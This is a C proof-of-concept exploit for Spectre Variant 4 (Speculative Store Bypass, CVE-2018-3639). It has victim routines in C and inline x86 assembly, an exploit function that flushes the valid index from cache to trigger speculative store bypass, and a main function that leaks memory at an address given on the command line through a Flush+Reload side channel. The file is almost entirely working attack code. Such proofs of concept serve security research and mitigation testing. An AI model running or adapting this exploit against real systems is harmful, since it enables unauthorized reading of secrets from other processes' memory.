/**
 * Spectre - Variant 4: Speculative Store Bypass (CVE-2018-3639)
 *
 * Description:
 *
 * Systems with microprocessors utilizing speculative execution and speculative execution
 * of memory reads before the addresses of all prior memory writes are known
 * may allow unauthorized disclosure of information to an attacker with local user access
 * via a side-channel analysis, aka Speculative Store Bypass (SSB), Variant 4.
 *
 */

#include "tools.h"

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

#ifdef ASM
#define VER "asm"
#else
#define VER "compiler-dependent"
#endif

uint8_t temp = 0; // To not optimize victim() function

/**
 * Function with compiler-dependent instructions. Sometimes it doesn't work because,
 * for example, GCC does unnecessary register manipulation
 */
void victim(size_t malicious_x) {
    volatile size_t x;
    x = malicious_x;
    flush_pipeline;
    x = buffer.x;
    temp &= buffer.array2[buffer.array1[x] * CACHE_PAGE];
}

/**
 * Function with assembly instructions optimized for the speculative store bypass
 */
void victim_asm(size_t malicious_x) {
    size_t x;
    asm volatile(
        "mov %1, %%rax\n"
        "mov %%rax, %0\n"
        "cpuid\n"
        "mfence\n"
        "mov %2, %%rax\n"
        "mov %%rax, %0\n"
        "mov %0, %%rax\n"
        "lea %3, %%rbx\n"
        "movzb (%%rbx,%%rax), %%rax\n"
        "shl $12, %%rax\n"
        "lea %4, %%rbx\n"
        "mov (%%rbx,%%rax), %%rax\n"
        : "=m"(x)
        : "m"(malicious_x), "m"(buffer.x), "m"(buffer.array1), "m"(buffer.array2)
        : "rax","rbx","rcx","rdx","memory");
}

size_t exploit(size_t address, int tries) {
    size_t malicious_x = address - (size_t)buffer.array1;   // Set a malicious (speculative) array index
    buffer.x = tries % buffer.array1_size;                  // Set a valid array index
    
    _mm_clflush(&buffer.x);     // Flush the valid index from cache to force speculative store
    flush_pipeline;
    
#ifdef ASM
    victim_asm(malicious_x);
#else
    victim(malicious_x);
#endif
    
    // Return the valid index to exclude it from Flush+Reload test
    return buffer.array1[buffer.x];
}

int main(int argc, const char **argv) {
    void *address = secret;
    size_t len = strlen(secret);
    
    if (argc == 3) {
        sscanf(argv[1], "%p", &address);
        sscanf(argv[2], "%zd", &len);
    }
    
    printf("CVE-2018-3639: Spectre Variant 4 (%s)\n", VER);
    return execute(address, len, 4000, exploit);
}
